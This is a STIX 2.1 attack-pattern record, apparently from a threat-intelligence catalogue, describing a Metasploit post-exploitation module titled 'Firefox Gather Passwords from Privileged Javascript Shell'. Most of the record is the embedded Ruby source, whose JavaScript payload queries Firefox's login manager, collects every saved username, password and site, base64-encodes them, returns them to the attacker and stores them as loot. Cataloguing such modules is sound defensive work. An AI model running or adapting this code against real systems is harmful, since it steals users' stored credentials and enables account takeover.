{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4d54fe51-9564-44b9-a477-b40eac160c70",
    "created": "2024-08-14T16:33:13.573433Z",
    "modified": "2024-08-14T16:33:13.573437Z",
    "name": "Firefox Gather Passwords from Privileged Javascript Shell",
    "description": " This module allows collection of passwords from a Firefox Privileged Javascript Shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/firefox/gather/passwords.rb",
            "external_id": "passwords.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Payload::Firefox\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox Gather Passwords from Privileged Javascript Shell',\n        'Description' => %q{\n          This module allows collection of passwords from a Firefox Privileged Javascript Shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'DisclosureDate' => '2014-04-11'\n      )\n    )\n\n    register_options([\n      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])\n    ])\n  end\n\n  def run\n    results = js_exec(js_payload)\n    if results.present?\n      begin\n        passwords = JSON.parse(results)\n        passwords.each do |entry|\n          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }\n        end\n\n        if !passwords.empty?\n          file = store_loot('firefox.passwords.json', 'text/json', rhost, passwords.to_json)\n          print_good(\"Saved #{passwords.length} passwords to #{file}\")\n        else\n          print_warning('No passwords were found in Firefox.')\n        end\n      rescue JSON::ParserError => e\n        print_warning(results)\n      end\n    end\n  end\n\n  def js_payload\n    %|\n      (function(send){\n        try {\n          var manager = Components\n                          .classes[\"@mozilla.org/login-manager;1\"]\n                          .getService(Components.interfaces.nsILoginManager);\n          var logins = manager.getAllLogins();\n          var passwords = [];\n          var b64 = Components.utils.import(\"resource://gre/modules/Services.jsm\").btoa;\n          var fields = ['password', 'passwordField', 'username', 'usernameField',\n                        'httpRealm', 'formSubmitURL', 'hostname'];\n\n          var sanitize = function(passwdObj) {\n            var sanitized = { };\n            for (var i in fields) {\n              sanitized[fields[i]] = b64(passwdObj[fields[i]]);\n            }\n            return sanitized;\n          }\n\n          // Find user from returned array of nsILoginInfo objects\n          for (var i = 0; i < logins.length; i++) {\n            passwords.push(sanitize(logins[i]));\n          }\n\n          send(JSON.stringify(passwords));\n        } catch (e) {\n          send(e);\n        }\n      })(this.send);\n    |.strip\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-11"
}